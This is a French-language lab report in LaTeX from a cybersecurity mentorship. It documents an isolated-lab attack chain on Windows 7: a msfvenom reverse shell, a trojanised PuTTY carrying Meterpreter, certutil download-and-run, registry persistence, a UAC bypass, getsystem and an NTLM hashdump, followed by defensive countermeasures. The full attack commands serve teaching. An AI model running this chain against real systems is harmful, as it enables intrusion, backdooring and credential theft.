@@ -1,0 +1,634 @@
+\documentclass[11pt,a4paper]{article}
+
+% ------------------------------------------------------------------
+%  Rapport de Lab Cyber -- Mentorat Cybersecurite / FORCE N
+%  Lab : Post-exploitation et elevation de privileges (Windows 7)
+% ------------------------------------------------------------------
+
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[french]{babel}
+\usepackage[a4paper,margin=2.3cm]{geometry}
+\usepackage{xcolor}
+\usepackage{graphicx}
+\usepackage{listings}
+\usepackage{fancyhdr}
+\usepackage{titlesec}
+\usepackage{enumitem}
+\usepackage{array}
+\usepackage{booktabs}
+\usepackage{longtable}
+\usepackage{tcolorbox}
+\usepackage[hidelinks]{hyperref}
+
+% ----- Couleurs de la charte -----
+\definecolor{forceblue}{HTML}{1E70BF}
+\definecolor{forcegreen}{HTML}{3AAA35}
+\definecolor{boxbg}{HTML}{F4F4F4}
+\definecolor{warnred}{HTML}{C0392B}
+
+% ----- Titres en bleu -----
+\titleformat{\section}{\normalfont\large\bfseries\color{forceblue}}{\thesection.}{0.6em}{}
+\titleformat{\subsection}{\normalfont\normalsize\bfseries\color{forceblue}}{\thesubsection}{0.6em}{}
+\titleformat{\subsubsection}{\normalfont\normalsize\bfseries}{}{0em}{}
+
+% ----- En-tete / pied de page -----
+\pagestyle{fancy}
+\fancyhf{}
+\setlength{\headheight}{30pt}
+\lhead{\raisebox{-0.3\height}{\IfFileExists{images/logo_forcen.png}{\includegraphics[height=0.85cm]{images/logo_forcen.png}}{\footnotesize\color{forceblue}FORCE N}}}
+\rhead{\small\color{forceblue} Élévation de privilèges, Mentorat Cybersécurité}
+\cfoot{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+
+% ----- Style des encadres de commandes -----
+\lstdefinestyle{cmd}{
+  basicstyle=\ttfamily\small,
+  frame=single,
+  rulecolor=\color{black!55},
+  backgroundcolor=\color{boxbg},
+  breaklines=true,
+  columns=fullflexible,
+  keepspaces=true,
+  xleftmargin=4pt,
+  framexleftmargin=4pt,
+  showstringspaces=false,
+  literate={é}{{\'e}}1 {è}{{\`e}}1 {à}{{\`a}}1 {ê}{{\^e}}1 {î}{{\^i}}1 {ô}{{\^o}}1 {ç}{{\c c}}1 {É}{{\'E}}1
+}
+\lstset{style=cmd}
+
+% ----- Macro d'insertion de capture (placeholder si le fichier manque) -----
+\newcommand{\capture}[2]{%
+  \begin{center}
+  \IfFileExists{#1}{\includegraphics[width=0.88\linewidth]{#1}}{%
+    \setlength{\fboxsep}{10pt}%
+    \fbox{\parbox[c][3.2cm][c]{0.85\linewidth}{\centering\itshape%
+      [ Capture à insérer ]\\ \texttt{\detokenize{#1}}}}}\\[3pt]
+  {\small\itshape #2}
+  \end{center}}
+
+% ----- Encadre d'avertissement -----
+\newtcolorbox{avertissement}{colback=warnred!6,colframe=warnred,boxrule=0.8pt,arc=2pt,
+  fonttitle=\bfseries,title=Avertissement légal et éthique}
+
+% ----- Bloc signature / authenticité GPG (réutilisable) -----
+\input{signature.tex}
+
+\begin{document}
+
+% ================================================================
+%                        PAGE DE TITRE
+% ================================================================
+\begin{titlepage}
+\centering
+\vspace*{1.5cm}
+
+\IfFileExists{images/logo_forcen.png}{\includegraphics[width=7cm]{images/logo_forcen.png}}{\fbox{\parbox[c][3cm][c]{7cm}{\centering\itshape [ logo\_forcen.png ]}}}\par
+\vspace{1.2cm}
+
+{\Large\bfseries\color{forceblue} Mentorat CYBERSÉCURITÉ CYB6 / Groupe 3\par}
+\vspace{0.4cm}
+{\large Encadrant : M. Ibrahima Samba DIOP\par}
+{\small Consultant en Cybersécurité\par}
+\vspace{2.2cm}
+
+\rule{\linewidth}{0.5pt}\\[0.4cm]
+{\huge\bfseries Rapport de Lab\par}
+\vspace{0.4cm}
+{\LARGE Post-exploitation et élévation\\ de privilèges sous Windows\par}
+\rule{\linewidth}{0.5pt}\\[1.5cm]
+
+\begin{tabular}{rl}
+\textbf{Étudiant(e) :} & HAMADY CISSE \\[0.5cm]
+\textbf{Date :} & \today \\[0.5cm]
+\textbf{Environnement :} & VirtualBox, réseau isolé \texttt{10.6.6.0/24} \\
+\end{tabular}
+
+\vfill
+{\small Document réalisé dans un cadre strictement pédagogique et sur un laboratoire isolé.}
+\end{titlepage}
+
+\tableofcontents
+\newpage
+
+% ================================================================
+\section{Introduction}
+% ================================================================
+Ce laboratoire met en pratique un scénario complet de \textbf{post-exploitation} sur une
+machine Windows~7 : génération d'un fichier malveillant avec \texttt{msfvenom}, obtention d'un
+accès à distance via une charge utile \emph{reverse~TCP}, dissimulation de la porte dérobée
+dans un logiciel légitime (PuTTY), puis \textbf{élévation de privilèges} par contournement de
+l'UAC jusqu'à l'obtention des droits \texttt{NT AUTHORITY\textbackslash SYSTEM}. L'objectif
+pédagogique est double : comprendre la chaîne offensive pas à pas, puis en déduire les
+\textbf{contre-mesures} défensives qui l'auraient brisée à chaque étape.
+
+\begin{avertissement}
+Toutes les manipulations décrites dans ce rapport ont été réalisées exclusivement sur un
+laboratoire \textbf{isolé} (réseau VirtualBox interne \texttt{10.6.6.0/24}, sans accès
+Internet), composé de machines virtuelles volontairement vulnérables appartenant à l'auteur.
+La machine cible est un Windows~7 de test, destiné à être détruit après le lab. N'effectuez
+jamais de création de porte dérobée, d'exploitation ou d'élévation de privilèges sur un
+système ou un réseau sans l'autorisation préalable et écrite de son propriétaire.
+\end{avertissement}
+
+\subsection{Objectifs}
+\begin{itemize}[leftmargin=1.4em]
+  \item Générer avec \texttt{msfvenom} un exécutable Windows malveillant à charge utile
+        \emph{reverse~TCP} et obtenir un \emph{shell} inversé sur la cible.
+  \item Transformer un logiciel légitime (PuTTY) en \textbf{cheval de Troie} embarquant une
+        charge \emph{Meterpreter}, et illustrer la notion de persistance.
+  \item Réaliser une \textbf{élévation de privilèges} par \emph{UAC bypass}, puis migrer vers
+        un processus \texttt{SYSTEM} et extraire les empreintes NTLM des comptes.
+  \item Déduire de chaque étape la contre-mesure défensive correspondante.
+\end{itemize}
+
+% ================================================================
+\section{Environnement du laboratoire}
+% ================================================================
+Le laboratoire repose sur deux machines virtuelles reliées par un réseau isolé
+\texttt{10.6.6.0/24} : une machine attaquante Kali Linux et une cible Windows~7.
+
+\begin{center}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{>{\bfseries}l l l l}
+\toprule
+Machine & Rôle & Adresse IP & Adresse MAC \\
+\midrule
+Kali Linux & Attaquant & \texttt{10.6.6.1/24} & \texttt{08:00:27:30:b2:40} \\
+Windows 7  & Cible / victime & \texttt{10.6.6.2/24} & \texttt{08:00:27:D5:11:03} \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\noindent\textbf{Configuration réseau.} Côté Kali, l'adresse statique est fixée dans
+\texttt{/etc/network/interfaces} ; côté Windows, elle est renseignée via le panneau de
+configuration des connexions réseau (\texttt{ncpa.cpl}).
+
+\begin{lstlisting}
+# Kali -- /etc/network/interfaces
+auto eth0
+iface eth0 inet static
+    address 10.6.6.1
+    netmask 255.255.255.0
+\end{lstlisting}
+
+\subsection{Vérification des interfaces}
+\capture{images/00_kali_ipconfig.png}{Sortie de \texttt{ip a} sur Kali : l'interface porte bien \texttt{10.6.6.1/24}.}
+\capture{images/00_win7_ipconfig.png}{Configuration IP de la cible Windows~7 (\texttt{ncpa.cpl}) : adresse \texttt{10.6.6.2}, masque \texttt{255.255.255.0}.}
+
+\subsection{Test de connectivité}
+\begin{lstlisting}
+ping -c 4 10.6.6.2
+\end{lstlisting}
+\capture{images/00_ping.png}{Ping de Kali vers la cible : 0\% de perte, les deux machines communiquent.}
+
+% ================================================================
+\section{Tâche 1 : Fichier malveillant autonome avec Reverse TCP}
+% ================================================================
+Cette première tâche construit la brique de base de toute post-exploitation : un exécutable
+Windows qui, une fois lancé sur la cible, \emph{rappelle} l'attaquant et lui ouvre un shell.
+On fabrique le binaire, on le diffuse via un serveur web, on met l'attaquant en écoute, puis
+on fait exécuter le fichier sur la victime.
+
+\subsection{Rappels théoriques}
+\textbf{msfvenom} est le générateur de charges utiles du framework Metasploit : il combine un
+\emph{payload} (le code qui s'exécutera sur la cible) et un \emph{encoder}/format de sortie
+pour produire un fichier autonome dans de nombreux formats (EXE, ELF, PHP, APK\ldots).
+
+Une charge \textbf{reverse~TCP} (connexion inversée) fait partir la connexion \emph{de la
+cible vers l'attaquant}, et non l'inverse. C'est le choix standard car le trafic sortant est
+généralement autorisé par les pare-feux et la translation d'adresses (NAT), alors qu'une
+connexion entrante (\emph{bind shell}) serait le plus souvent bloquée.
+
+Le payload \texttt{windows/shell/reverse\_tcp} fournit un simple \textbf{interpréteur de
+commandes Windows} (\texttt{cmd.exe}) distant. Le module \texttt{exploit/multi/handler} est le
+« réceptionniste » côté Metasploit : il attend la connexion entrante de la charge et ouvre la
+session.
+
+\subsection{Manipulations}
+\textbf{1. Générer l'exécutable malveillant \texttt{file.exe} avec msfvenom :}
+\begin{lstlisting}
+msfvenom -p windows/shell/reverse_tcp LHOST=10.6.6.1 LPORT=9999 -f exe > /tmp/file.exe
+\end{lstlisting}
+\capture{images/01_msfvenom_fileexe.png}{msfvenom sélectionne l'architecture x86 et produit \texttt{file.exe} (payload 354 bytes, taille finale 7168 bytes) enregistré dans \texttt{/tmp}.}
+
+\textbf{2. Servir le fichier depuis Kali avec un serveur web Python :}
+\begin{lstlisting}
+cd /tmp
+python -m http.server
+\end{lstlisting}
+\capture{images/01_httpserver.png}{Le serveur Python écoute sur le port TCP 8000 et sert le contenu de \texttt{/tmp}.}
+
+\textbf{3. Mettre l'attaquant en écoute avec \texttt{multi/handler} (seconde fenêtre) :}
+\begin{lstlisting}
+msfconsole
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set LHOST 10.6.6.1
+set LPORT 9999
+exploit -j
+\end{lstlisting}
+\capture{images/01_multihandler.png}{Le handler démarre en tâche de fond (\emph{job}) et écoute le reverse~TCP sur \texttt{10.6.6.1:9999}.}
+
+\textbf{4. Sur la cible Windows, télécharger puis exécuter \texttt{file.exe} :}
+\begin{lstlisting}
+http://10.6.6.1:8000/
+\end{lstlisting}
+\capture{images/01_download_ie.png}{Le fichier \texttt{file.exe} téléchargé via Internet Explorer depuis \texttt{http://10.6.6.1:8000/} apparaît dans le dossier \texttt{Downloads} de la victime (7~Ko, type \og Application \fg{}), prêt à être exécuté.}
+
+\textbf{5. Récupérer la session shell côté Kali :}
+\begin{lstlisting}
+sessions -i 1
+\end{lstlisting}
+\capture{images/01_shell.png}{\og Command shell session~1 opened (10.6.6.1:9999 $\rightarrow$ 10.6.6.2) \fg{} : l'invite \texttt{C:\textbackslash Users\textbackslash cisse\textbackslash Desktop>} et \texttt{whoami} = \texttt{cisse-vm\textbackslash cisse} confirment le contrôle distant.}
+\capture{images/01_whoami_priv.png}{\texttt{whoami /priv} : les privilèges de l'utilisateur standard sont limités (la plupart \emph{Disabled}), ce qui motivera l'élévation de la tâche 3.}
+
+\subsection{Questions de la tâche 1}
+\textbf{Q1. Expliquez Msfvenom ainsi que ses fonctionnalités.}
+
+\textit{Réponse :} \texttt{msfvenom} est l'outil de génération de charges utiles de Metasploit,
+né de la fusion de \texttt{msfpayload} (sélection de la charge) et \texttt{msfencode}
+(encodage). Ses fonctionnalités principales :
+\begin{itemize}[leftmargin=1.4em]
+  \item \textbf{Choix du payload} (\texttt{-p}) parmi des milliers de charges, avec leurs
+        variables (\texttt{LHOST}, \texttt{LPORT}\ldots) ;
+  \item \textbf{Formats de sortie} (\texttt{-f}) : \texttt{exe}, \texttt{elf}, \texttt{php},
+        \texttt{raw}, etc. (\texttt{-{}-list formats} les énumère) ;
+  \item \textbf{Encodage} (\texttt{-e}, \texttt{-i} itérations) pour modifier la signature du
+        binaire et compliquer la détection par signature ;
+  \item \textbf{Injection dans un exécutable légitime} (\texttt{-x}) pour fabriquer un cheval
+        de Troie (voir tâche 2) ;
+  \item \textbf{Suppression de mauvais caractères} (\texttt{-b}) et choix de l'architecture
+        (\texttt{-a}) / plateforme (\texttt{-{}-platform}).
+\end{itemize}
+En somme, il transforme une charge Metasploit en un fichier autonome utilisable hors du
+framework, que l'écouteur \texttt{multi/handler} récupère ensuite.
+
+\medskip\noindent\textbf{Q2. Pourquoi utilise-t-on une charge \emph{reverse} TCP plutôt qu'une charge \emph{bind} ?}
+
+\textit{Réponse :} Dans un \emph{bind shell}, c'est la cible qui ouvre un port en écoute et
+attend l'attaquant : une connexion \emph{entrante} que le pare-feu de la victime ou le NAT
+bloquent presque toujours. Le \emph{reverse shell} inverse le sens : la cible initie la
+connexion \emph{sortante} vers l'attaquant, trafic généralement autorisé. C'est donc bien plus
+fiable pour franchir pare-feux et passerelles NAT.
+
+\medskip\noindent\textbf{Q3. À quoi servent les paramètres \texttt{LHOST} et \texttt{LPORT}, et pourquoi doivent-ils être identiques côté charge et côté handler ?}
+
+\textit{Réponse :} \texttt{LHOST} est l'adresse de l'attaquant (\emph{Listening HOST}) vers
+laquelle la charge se reconnecte, et \texttt{LPORT} le port d'écoute. Ils sont \emph{inscrits
+en dur} dans le binaire au moment de la génération. Si le \texttt{multi/handler} n'écoute pas
+exactement sur le même couple \texttt{LHOST:LPORT} (et le même payload), la connexion entrante
+n'est pas reconnue et aucune session ne s'ouvre.
+
+% ================================================================
+\section{Tâche 2 : Cheval de Troie associé à PuTTY}
+% ================================================================
+Un \texttt{file.exe} nu éveille les soupçons. Cette tâche montre comment \textbf{dissimuler}
+la charge dans un logiciel réel et reconnu (PuTTY) pour que la victime l'exécute en toute
+confiance, tout en passant à une charge \textbf{Meterpreter} plus complète.
+
+\subsection{Rappels théoriques}
+Un \textbf{cheval de Troie} est un programme d'apparence légitime qui embarque, à l'insu de
+l'utilisateur, une fonction cachée malveillante. Ici, PuTTY continue de fonctionner
+normalement pendant que la charge s'exécute en arrière-plan.
+
+\textbf{Meterpreter} est un \emph{shell} post-exploitation avancé de Metasploit : il réside en
+mémoire (furtif, sans écriture disque de la charge), et offre des commandes de reconnaissance,
+de collecte (\texttt{hashdump}), de migration de processus, d'élévation (\texttt{getsystem})
+et de persistance, bien au-delà d'un simple \texttt{cmd.exe}.
+
+L'\textbf{encodage} \texttt{shikata\_ga\_nai} (option \texttt{-e}, ici \texttt{-i 10}
+itérations) ré-encode la charge pour brouiller sa signature ; l'option \texttt{-k} conserve le
+comportement normal du programme hôte ; \texttt{-x} indique le binaire légitime à infecter.
+
+\subsection{Manipulations}
+\textbf{1. Télécharger le binaire légitime PuTTY sur Kali :}
+\begin{lstlisting}
+wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe -O putty.exe
+\end{lstlisting}
+\capture{images/02_wget_putty.png}{Récupération de \texttt{putty.exe}, le programme hôte qui servira de leurre.}
+
+\textbf{2. Injecter la charge Meterpreter dans PuTTY avec msfvenom :}
+\begin{lstlisting}
+msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=10.6.6.1 LPORT=4444 -e x86/shikata_ga_nai -i 10 -b "\x00" -f exe -o PUTTY.EXE
+\end{lstlisting}
+\capture{images/02_msfvenom_putty.png}{msfvenom encode la charge 10 fois avec \texttt{shikata\_ga\_nai} et produit \texttt{PUTTY.EXE} (final size 1913856 bytes).}
+
+\textbf{3. Servir \texttt{PUTTY.EXE} et mettre l'attaquant en écoute (charge Meterpreter) :}
+\begin{lstlisting}
+cd /tmp && python3 -m http.server 8080    # fenetre 1 : serveur web
+msfconsole                                 # fenetre 2 : ecouteur
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.6.6.1
+set LPORT 4444
+exploit
+\end{lstlisting}
+\capture{images/02_httpserver.png}{Le serveur Python sert le répertoire \texttt{/tmp} (qui contient \texttt{PUTTY.EXE}) sur le port 8080.}
+\capture{images/02_handler_meterpreter.png}{Le handler écoute le reverse~TCP Meterpreter sur \texttt{10.6.6.1:4444} ; dès l'exécution de \texttt{PUTTY.EXE} sur la cible, \og Meterpreter session 1 opened (10.6.6.1:4444 $\rightarrow$ 10.6.6.2) \fg{} et l'invite \texttt{meterpreter >} confirment l'accès interactif avancé.}
+
+\textbf{4. Sur la cible Windows, télécharger puis exécuter \texttt{PUTTY.EXE} :}
+\begin{lstlisting}
+certutil -urlcache -split -f http://10.6.6.1:8080/PUTTY.EXE PUTTY.EXE
+PUTTY.EXE
+\end{lstlisting}
+\capture{images/02_download_putty.png}{\texttt{PUTTY.EXE} est bien présent sur la victime (\texttt{1\,914\,368} octets, taille identique au binaire généré) ; son exécution ouvre PuTTY normalement et déclenche la connexion retour.}
+
+\textbf{5. Assurer la persistance (module \texttt{registry\_userinit}) :}
+La session Meterpreter de PuTTY ouvre un accès, mais celui-ci disparaît au redémarrage de la
+cible. Pour \textbf{maintenir l'accès}, on installe une porte dérobée persistante : le module
+\texttt{exploit/windows/persistence/registry\_userinit} dépose la charge sur le disque et
+inscrit son chemin dans la clé \texttt{Userinit}
+(\texttt{HKLM\textbackslash ...\textbackslash Winlogon}), de sorte qu'elle est relancée à
+\emph{chaque} ouverture de session. L'écriture dans \texttt{HKLM} exigeant des droits élevés,
+cette manipulation est réalisée depuis la session \textbf{SYSTEM} obtenue à la tâche~3.
+\begin{lstlisting}
+background
+use exploit/windows/persistence/registry_userinit
+set SESSION 2
+set LHOST 10.6.6.1
+set LPORT 6666
+run
+\end{lstlisting}
+\capture{images/02_persistence.png}{Le module dépose la charge et écrit la clé de registre \texttt{Userinit} : l'accès sera automatiquement rétabli à chaque connexion d'un utilisateur, même après redémarrage.}
+
+\subsection{Questions de la tâche 2}
+\textbf{Q1. Qu'est-ce qu'un cheval de Troie et en quoi l'option \texttt{-x} de msfvenom en crée-t-elle un ?}
+
+\textit{Réponse :} Un cheval de Troie est un programme utile en apparence qui cache une
+fonction malveillante. L'option \texttt{-x <fichier>} indique à msfvenom un exécutable
+légitime (ici PuTTY) dans lequel \textbf{injecter} la charge ; couplée à \texttt{-k}, elle
+préserve le fonctionnement normal de l'application, de sorte que la victime voit PuTTY
+démarrer pendant que la charge s'exécute discrètement : exactement le comportement d'un cheval
+de Troie.
+
+\medskip\noindent\textbf{Q2. Quelle différence entre la charge \texttt{shell/reverse\_tcp} (tâche 1) et \texttt{meterpreter/reverse\_tcp} (tâche 2) ?}
+
+\textit{Réponse :} \texttt{shell/reverse\_tcp} ouvre un simple \texttt{cmd.exe} distant :
+limité aux commandes Windows natives. \texttt{meterpreter/reverse\_tcp} charge Meterpreter,
+un agent résidant en mémoire qui ajoute des capacités de post-exploitation
+(\texttt{hashdump}, \texttt{migrate}, \texttt{getsystem}, modules locaux d'élévation,
+pivoting, keylogging\ldots) et reste plus furtif. C'est le socle indispensable des tâches
+d'élévation suivantes.
+
+\medskip\noindent\textbf{Q3. À quoi sert l'encodage \texttt{shikata\_ga\_nai} et pourquoi n'est-il plus suffisant face aux antivirus modernes ?}
+
+\textit{Réponse :} Il ré-encode la charge (ici 10 itérations) pour en modifier la signature
+binaire et déjouer une détection \emph{par signature} statique. Mais les antivirus modernes
+reposent aussi sur l'\emph{analyse comportementale}, l'\emph{émulation} et la réputation :
+un PuTTY altéré qui ouvre une connexion sortante vers un port inhabituel reste détectable.
+L'encodage obscurcit la forme, pas le comportement ; il ne constitue donc pas un contournement
+fiable.
+
+% ================================================================
+\section{Tâche 3 : Élévation de privilèges (UAC Bypass)}
+% ================================================================
+L'accès obtenu reste celui d'un utilisateur à droits limités. Cette tâche franchit la dernière
+marche : contourner l'UAC pour obtenir un jeton à \textbf{haute intégrité}, migrer vers un
+processus \texttt{SYSTEM} et extraire les empreintes NTLM de tous les comptes.
+
+\subsection{Rappels théoriques}
+L'\textbf{UAC} (\emph{User Account Control}) est un mécanisme de Windows qui sépare les
+privilèges standards des privilèges administrateur. Même membre du groupe Administrateurs, un
+utilisateur exécute ses applications avec un jeton \emph{filtré} (intégrité \emph{Medium}) ;
+toute action sensible exige une élévation explicite (la fameuse invite UAC) vers un jeton à
+intégrité \emph{High}.
+
+Un \textbf{UAC bypass} exploite une faiblesse de ce mécanisme pour obtenir le jeton élevé
+\emph{sans} invite. Le module \texttt{bypassuac\_eventvwr} abuse d'une clé de registre
+(\texttt{HKCU\textbackslash Software\textbackslash Classes\textbackslash mscfile\textbackslash
+shell\textbackslash open\textbackslash command}) que l'Observateur d'événements
+(\texttt{eventvwr.exe}, un binaire Microsoft signé et auto-élevé) lit au démarrage : en la
+détournant, on fait exécuter notre charge en haute intégrité.
+
+\texttt{getsystem} va ensuite plus loin que l'administrateur : il usurpe le compte
+\texttt{NT AUTHORITY\textbackslash SYSTEM}, le compte le plus privilégié du système, le plus
+souvent par \emph{Named Pipe Impersonation}.
+
+\subsection{Manipulations}
+\textbf{1. Identifier le niveau d'accès initial (depuis la session Meterpreter) :}
+\begin{lstlisting}
+getuid
+\end{lstlisting}
+\capture{images/03_getuid.png}{\texttt{getuid} renvoie \texttt{cisse-vm\textbackslash cisse} (et \texttt{sysinfo} : \texttt{CISSE-VM}, Windows~7 SP1, x86) : un utilisateur standard, pas encore SYSTEM.}
+
+\textbf{2. Mettre la session de côté pour lancer le module local :}
+\begin{lstlisting}
+background
+\end{lstlisting}
+\capture{images/03_background.png}{La session Meterpreter passe en arrière-plan (\emph{Backgrounding session 1}).}
+
+\textbf{3. Exécuter le contournement UAC :}
+\begin{lstlisting}
+use exploit/windows/local/bypassuac_eventvwr
+set session 1
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.6.6.1
+set LPORT 5555
+run
+\end{lstlisting}
+\capture{images/03_bypassuac.png}{Le module configure la clé de registre, lance \texttt{eventvwr.exe} et ouvre une \textbf{nouvelle} session Meterpreter (session 2) en haute intégrité.}
+
+\textbf{4. Basculer sur la nouvelle session (élevée) et passer SYSTEM :}
+\begin{lstlisting}
+sessions -i 2
+getuid
+getsystem
+getuid
+\end{lstlisting}
+\capture{images/03_getsystem.png}{Interaction avec la session~2 (issue du bypass UAC) ; \texttt{getsystem} réussit \og got system via technique 1 (Named Pipe Impersonation) \fg{} et \texttt{getuid} renvoie désormais \texttt{NT AUTHORITY\textbackslash SYSTEM}.}
+
+\textbf{5. Confirmer les privilèges obtenus :}
+\begin{lstlisting}
+getprivs
+\end{lstlisting}
+\capture{images/03_getprivs.png}{La présence de \texttt{SeDebugPrivilege}, \texttt{SeTakeOwnershipPrivilege}, etc. confirme le statut administrateur (haute intégrité).}
+
+\textbf{6. Migrer vers un processus SYSTEM puis extraire les empreintes NTLM :}
+\begin{lstlisting}
+ps
+migrate 492
+hashdump
+\end{lstlisting}
+\capture{images/03_ps.png}{\texttt{ps} liste les processus ; on repère un processus tournant sous \texttt{NT AUTHORITY\textbackslash SYSTEM} (ex. \texttt{lsass.exe}, PID~492).}
+\capture{images/03_migrate.png}{\texttt{migrate 492} déplace Meterpreter dans \texttt{lsass.exe} : \og Migration completed successfully \fg{}, et \texttt{getuid} confirme \texttt{NT AUTHORITY\textbackslash SYSTEM}.}
+\capture{images/03_hashdump.png}{\texttt{hashdump} extrait les empreintes NTLM des comptes locaux (\texttt{Administrator}, \texttt{cisse}, \texttt{Guest}, \texttt{HomeGroupUser\$}).}
+
+\subsection{Questions de la tâche 3}
+\textbf{Q1. Qu'est-ce que l'UAC et pourquoi un membre du groupe Administrateurs n'a-t-il pas tous ses droits par défaut ?}
+
+\textit{Réponse :} L'UAC sépare les privilèges standards des privilèges administrateur. Sous
+le modèle \emph{Admin Approval Mode}, même un administrateur reçoit à l'ouverture de session
+\emph{deux} jetons : un jeton standard filtré (intégrité Medium) utilisé par défaut, et un
+jeton complet (High) activé seulement après validation explicite. Ainsi, une application
+lancée normalement (y compris une charge malveillante) s'exécute avec des droits limités
+tant qu'une élévation n'a pas été approuvée. C'est précisément cette barrière que le lab
+contourne.
+
+\medskip\noindent\textbf{Q2. Comment le module \texttt{bypassuac\_eventvwr} contourne-t-il l'UAC sans déclencher d'invite ?}
+
+\textit{Réponse :} \texttt{eventvwr.exe} (Observateur d'événements) est un binaire Microsoft
+signé et marqué \emph{auto-élevé} : il obtient le jeton High \emph{sans} invite UAC. Au
+démarrage, il consulte une clé de registre sous \texttt{HKCU} (modifiable par l'utilisateur
+courant, sans privilège) pour savoir quelle commande lancer. Le module y inscrit le chemin de
+notre charge : quand \texttt{eventvwr.exe} s'auto-élève, il exécute notre code à sa place, en
+haute intégrité, sans aucune invite. C'est un détournement de la logique d'auto-élévation,
+pas une faille mémoire.
+
+\medskip\noindent\textbf{Q3. Quelle différence entre un accès « Administrateur » et \texttt{NT AUTHORITY\textbackslash SYSTEM}, et que permet \texttt{hashdump} une fois SYSTEM ?}
+
+\textit{Réponse :} L'administrateur est le compte le plus puissant \emph{côté utilisateur} ;
+\texttt{SYSTEM} est le compte du système d'exploitation lui-même, encore au-dessus, utilisé
+par les services du noyau. Seul SYSTEM peut lire la base de comptes sécurisée (la ruche SAM et
+le secret LSA). \texttt{hashdump} profite de ce niveau pour extraire les \textbf{empreintes
+NTLM} des mots de passe locaux ; celles-ci alimentent ensuite des attaques par
+\emph{pass-the-hash} (réutilisation de l'empreinte sans connaître le mot de passe) ou un
+cassage hors ligne.
+
+% ================================================================
+\section{Réflexion globale et conclusion}
+% ================================================================
+\begin{enumerate}[leftmargin=1.6em]
+  \item \textbf{Difficultés rencontrées et solutions :}
+  \begin{itemize}[leftmargin=1.2em]
+    \item \emph{Aucune session ne s'ouvre} : divergence entre le binaire et le handler
+          $\rightarrow$ aligner \texttt{payload}, \texttt{LHOST}, \texttt{LPORT} \emph{et}
+          l'architecture (x86/x64) des deux côtés.
+    \item \emph{Port du serveur web} : l'énoncé mentionne tantôt \texttt{8000} tantôt
+          \texttt{8080} ; \texttt{python -m http.server} écoute \texttt{8000} par défaut
+          $\rightarrow$ ouvrir l'URL sur le port réellement affiché, ou préciser le port.
+    \item \emph{\texttt{getsystem} échoue depuis la 1\textsuperscript{re} session} : le jeton
+          est encore à intégrité Medium $\rightarrow$ passer d'abord par le \emph{UAC bypass}
+          pour obtenir un jeton High, puis \texttt{getsystem}.
+    \item \emph{Détection antivirus} : un EXE non chiffré est vite repéré $\rightarrow$ en
+          environnement réel, l'encodage seul ne suffit pas (voir Q3 tâche 2).
+  \end{itemize}
+
+  \item \textbf{Application en milieu professionnel :} cette chaîne reproduit un test
+        d'intrusion interne : phase d'\emph{accès initial} (ingénierie sociale + charge),
+        puis \emph{post-exploitation} et \emph{escalade}. L'auditeur documente chaque étape
+        pour démontrer l'impact (compromission totale d'un poste, vol d'empreintes) et
+        prioriser les correctifs.
+
+  \item \textbf{Mesures de défense recommandées :}
+  \begin{itemize}[leftmargin=1.2em]
+    \item \emph{Accès initial / charge :} antivirus/EDR à analyse comportementale, filtrage
+          des exécutables (AppLocker, WDAC), blocage des téléchargements non signés,
+          sensibilisation des utilisateurs.
+    \item \emph{Cheval de Troie :} ne télécharger les logiciels que depuis les sources
+          officielles, vérifier les signatures et empreintes, contrôle applicatif par
+          liste blanche.
+    \item \emph{UAC bypass :} régler l'UAC sur \emph{Toujours notifier}, retirer les
+          utilisateurs du groupe Administrateurs (moindre privilège), maintenir le système à
+          jour ; ces bypass visent des versions anciennes (Windows~7 est en fin de vie).
+    \item \emph{Vol d'empreintes :} Credential Guard, LSASS protégé (RunAsPPL), désactivation
+          de LM, comptes à mots de passe forts et uniques pour limiter le
+          \emph{pass-the-hash}.
+  \end{itemize}
+
+  \item \textbf{Hiérarchie des contre-mesures :} prioriser (1) le \textbf{moindre privilège}
+        (ne pas travailler en administrateur) et la \textbf{mise à jour} du système, qui
+        suppriment la majorité des bypass ; puis (2) le \textbf{contrôle applicatif} (liste
+        blanche) qui bloque l'exécution de la charge en amont ; enfin (3) la
+        \textbf{détection} (EDR, supervision) qui rattrape ce qui est passé. La prévention en
+        amont coûte moins cher que la remédiation après compromission.
+\end{enumerate}
+
+\medskip
+\noindent\textbf{Conclusion.} Ce lab a montré, de bout en bout, comment un simple exécutable
+transforme un accès utilisateur en contrôle total d'un poste : charge \emph{reverse~TCP},
+dissimulation dans un logiciel de confiance, puis élévation jusqu'à \texttt{SYSTEM} et vol des
+empreintes. La leçon principale est que la sécurité repose sur la \textbf{confiance accordée
+aux exécutables} et sur le \textbf{principe de moindre privilège} : un système à jour, un
+utilisateur non-administrateur et un contrôle applicatif strict auraient brisé la chaîne à
+chaque maillon.
+
+% ================================================================
+\section{Annexe : commandes utilisées, rôles et options}
+% ================================================================
+Cette annexe regroupe l'ensemble des commandes employées durant le lab, avec leur rôle et le
+détail de leurs principales options.
+
+\renewcommand{\arraystretch}{1.25}
+\begin{longtable}{@{}p{6.4cm} p{8.4cm}@{}}
+\toprule
+\textbf{Commande} & \textbf{Rôle et options} \\
+\midrule
+\endfirsthead
+\toprule
+\textbf{Commande} & \textbf{Rôle et options} \\
+\midrule
+\endhead
+\midrule
+\multicolumn{2}{r}{\footnotesize\itshape suite page suivante} \\
+\endfoot
+\bottomrule
+\endlastfoot
+
+\multicolumn{2}{@{}l}{\textbf{\color{forceblue}Réseau et diagnostic}} \\*
+\midrule
+\lstinline!ip a! &
+  Affiche les interfaces et adresses IP sur Kali. \\
+\lstinline!ping -c 4 10.6.6.2! &
+  Teste la connectivité vers la cible ; \texttt{-c 4} limite à 4 paquets. \\
+\midrule
+
+\multicolumn{2}{@{}l}{\textbf{\color{forceblue}Tâche 1 : charge autonome (shell)}} \\*
+\midrule
+\lstinline!msfvenom -p windows/shell/reverse_tcp LHOST=10.6.6.1 LPORT=9999 -f exe > /tmp/file.exe! &
+  Génère un EXE à shell inversé. \texttt{-p} payload ; \texttt{LHOST/LPORT} adresse et port de retour ; \texttt{-f exe} format exécutable Windows ; \texttt{>} redirige vers un fichier. \\
